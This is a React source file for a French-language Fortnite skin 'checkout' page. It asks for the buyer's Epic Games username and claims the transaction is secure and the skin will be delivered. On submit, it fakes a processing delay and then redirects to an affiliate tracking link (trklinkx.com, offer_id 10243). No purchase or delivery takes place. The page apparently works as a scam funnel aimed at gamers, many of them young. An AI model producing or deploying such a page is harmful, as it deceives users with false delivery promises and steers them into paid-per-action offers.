import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { ArrowLeft, User, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { motion } from "framer-motion";

const Checkout = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Support both formats: skin object or direct properties
  const skin = location.state?.skin || {
    name: location.state?.name || "Article",
    image: location.state?.image || "/placeholder.svg",
    price: location.state?.price || 0,
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim()) return;
    
    setIsSubmitting(true);
    // Simulate processing then redirect
    setTimeout(() => {
      window.location.href = "https://t.trklinkx.com/click?pid=4784&offer_id=10243&sub3=fortnite";
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[hsl(220_60%_15%)] via-[hsl(215_50%_20%)] to-[hsl(210_40%_25%)]">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-background/80 backdrop-blur-md border-b border-border/50">
        <div className="container mx-auto px-4 py-4 flex items-center gap-4">
          <Button
            variant="ghost"
            size="icon"
            onClick={() => navigate(-1)}
            className="text-foreground hover:bg-secondary"
          >
            <ArrowLeft className="w-5 h-5" />
          </Button>
          <h1 className="font-fortnite text-2xl text-foreground">FINALISER L'ACHAT</h1>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 md:py-16">
        <div className="max-w-4xl mx-auto">
          <div className="grid md:grid-cols-2 gap-8 md:gap-12">
            {/* Skin Preview */}
            <motion.div
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.5 }}
              className="relative"
            >
              <div className="relative rounded-2xl overflow-hidden bg-gradient-to-br from-[hsl(215_50%_60%)] to-[hsl(215_45%_50%)] shadow-2xl">
                <div className="absolute inset-[2px] rounded-[14px] border border-white/20" />
                <img
                  src={skin.image}
                  alt={skin.name}
                  className="w-full aspect-[3/4] object-cover object-top"
                />
                <div className="absolute bottom-0 left-0 right-0 p-6 bg-gradient-to-t from-black/80 to-transparent">
                  <h2 className="font-fortnite text-3xl text-white mb-2">{skin.name}</h2>
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-[hsl(45_100%_50%)] flex items-center justify-center">
                      <span className="text-[hsl(45_100%_20%)] text-xs font-bold">V</span>
                    </div>
                    <span className="text-white font-bold text-2xl">
                      {typeof skin.price === 'number' && skin.price < 100 
                        ? `${skin.price.toFixed(2)} €` 
                        : `${skin.price.toLocaleString()} V-Bucks`}
                    </span>
                  </div>
                </div>
              </div>
            </motion.div>

            {/* Form */}
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.5, delay: 0.1 }}
              className="flex flex-col justify-center"
            >
              <div className="bg-card/50 backdrop-blur-sm rounded-2xl p-6 md:p-8 border border-border/50">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-12 h-12 rounded-full bg-primary/20 flex items-center justify-center">
                    <User className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-fortnite text-xl text-foreground">COMPTE EPIC GAMES</h3>
                    <p className="text-muted-foreground text-sm">Entrez votre nom d'utilisateur</p>
                  </div>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-2">
                    <label htmlFor="username" className="text-foreground font-medium text-sm">
                      Nom d'utilisateur Epic Games
                    </label>
                    <Input
                      id="username"
                      type="text"
                      placeholder="Ex: NinjaFortnite123"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="h-12 bg-background/50 border-border/50 text-foreground placeholder:text-muted-foreground focus:border-primary"
                      required
                      maxLength={50}
                    />
                    <p className="text-muted-foreground text-xs">
                      Assurez-vous que le nom d'utilisateur est correct pour recevoir votre skin.
                    </p>
                  </div>

                  <div className="flex items-start gap-3 p-4 bg-primary/10 rounded-lg border border-primary/20">
                    <ShieldCheck className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-foreground/80">
                      Transaction sécurisée. Votre skin sera envoyé directement sur votre compte Epic Games.
                    </p>
                  </div>

                  <Button
                    type="submit"
                    disabled={!username.trim() || isSubmitting}
                    className="w-full h-14 btn-epic-primary text-lg font-fortnite tracking-wider"
                  >
                    {isSubmitting ? (
                      <span className="flex items-center gap-2">
                        <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        TRAITEMENT...
                      </span>
                    ) : (
                      `ACHETER POUR ${typeof skin.price === 'number' && skin.price < 100 ? `${skin.price.toFixed(2)} €` : `${skin.price.toLocaleString()} V-BUCKS`}`
                    )}
                  </Button>
                </form>
              </div>
            </motion.div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Checkout;